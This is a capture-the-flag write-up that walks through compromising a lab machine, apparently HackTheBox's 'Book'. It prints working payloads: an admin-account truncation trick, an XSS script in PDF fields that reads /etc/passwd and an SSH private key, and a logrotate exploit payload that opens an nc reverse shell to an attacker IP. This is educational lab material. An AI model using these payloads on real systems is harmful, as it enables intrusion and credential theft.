Enumeration

Here's what showed up for host enumeration. Scanning all the ports with the -p- flag didn't yield any more results.

In the web app we get an account login and account creation page.

I started gobuster in the background and then I started making an account for the page. I used basic credentials for my account 4321@4321.com:4321 and I was able to login. I found two interesting pages: a file upload page and an admin email.

Let's go check back on the web enumeration.

Most of the pages we found were available in the portal, with the exception of db.php and /admin. Going to db.php gave a blank site, but /admin prompted us with a login page.

Since I had the email, I tried testing out a few basic passwords but they didn't yield any results. I tried creating an account with the admin email, here's what the request looked like.

I fuzzed the parameters and I eventually created an admin account with the following:
name=test&email=admin%40book.htb x&passwd=test
I found this article afterwards but here is why it worked.. Here's what the admin panel looked like.

I found a few interesting things:

User

I looked up any vulnerability with a pdf upload and I came across this article. Essentially, I can use XSS to read certain files in the system. With the title/author input as
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
we can read /etc/passwd when we download the collection pdf from the admin panel.

We can see users root, mysql and reader. Maybe we can alter the request to read an ssh key by changing the path to ///home/reader/.ssh/id_rsa? Here's the setup, the uploaded file doesn't really matter.

Wait a few seconds and download the file again, and we get our ssh key!

Some people struggled with formatting issues regarding the font size, but I copied the key by opening the image from firefox, pasting it into nano, and then used the first character of each line so I know when to start a new line and it worked without problems. I changed the permissions on the key and was able to ssh and read user.txt.

Privilege Escalation

There was nothing really interesting in reader's home but some empty backup files. Just some empty files named access.log and access.log.1. Web application files are usually stored in /var/www/html and looking at the previously empty page db.php, I found mysql credentials.

I looked around the database and didn't find anything that helped. I ran LinEnum.sh and pspy. LinEnum didn't show any interesting but pspy4 showed this interesting process.

This process along with the backup files made me suspicious. I looked for any logrotate exploits and I found this article which allows me to execute a file as root. I downloaded and compiled the code and sent it over to the vulnerable machine with python HTTP. I created the payload which would place root's ssh key into reader's home, and then I could ssh as root.

However, after a few attempts the file wasn't being written. So i changed the payload to
echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash 10.10.14.17 1234 &; cat /root/.ssh/root.txt > /tmp/loot.txt); fi" > hackermans
just in case. And instead of waiting for the process to run, it was possible to trigger it by echoing something into /home/reader/backups/access.log.

On my listener, the shell was only open for a few seconds so I decided to read the root ssh key. If you find yourself with a reverse shell that closes quickly, you can type commands while your waiting for your connection, and when the shell arrives, the commands are automatically sent into the shell.

As you can see, I was three characters away from reading the root flag before the shell closed.

I added the neccessary permissions to the key and I was able to ssh as root and read the flag. I checked /tmp to see if root's ssh key was copied to /tmp.

And it was! This box was interesting in that I realized it's better to prioritize ssh keys as opposed to a reverse shell if you have the option.
